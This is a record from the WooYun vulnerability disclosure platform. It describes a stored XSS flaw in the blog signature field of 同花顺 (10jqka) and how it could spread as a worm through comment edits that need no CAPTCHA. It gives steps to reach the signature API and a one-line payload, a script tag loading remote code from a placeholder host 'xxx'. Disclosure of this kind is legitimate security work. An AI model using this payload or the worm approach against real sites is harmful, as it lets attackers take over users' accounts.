{"id": 38896, "wybug_id": "wooyun-2015-095228", "wybug_title": "同花顺某系统存在一处存储型xss漏洞,可形成蠕虫效应", "wybug_corp": "同花顺", "wybug_author": "高灰", "wybug_date": "2015-02-02 16:02", "wybug_open_date": "2015-03-19 16:04", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "6", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-19：\t细节向公众公开  简要描述： 同花顺某系统存在一处存储型xss漏洞,可自发传播，形成蠕虫效应。 详细说明：  同花顺的博客系统的签名处允许写入任意js代码（只要别人打开这个人的博客的任何一个页面，就可以激活这段代码），修改评论不需要验证码，同时利用这两点可使蠕虫主动传播，从一个用户传播到另外多个用户。如果有一些比较有名的评股人员也被感染，传播速度将大大加速。http://blog.10jqka.com.cn/215824896/   漏洞证明：  登录: http://pass.10jqka.com.cn/login\n\n登录后直接进入http://blog.10jqka.com.cn/再进入我的博客\n\n编辑博客简介即可获取设置博客简介的api\n\n此api请求为xmlhttprequest， 只有一个参数content, 所以只要可以执行js就有权限修改这个内容。\n\n接下来在这个签名里面写入脚本，保存\n\n刷新页面， 脚本已执行。虽然这里只有300个字符可以写，但写一个<script src=\"http://xxx/1.js\"></script>还是足够了的。\n\n于是有了以下蠕虫的思路\n\n   修复方案：  过滤用户输入中的脚本。   版权声明：转载请注明来源 高灰@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-02-02 16:13 厂商回复： 正在修补 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}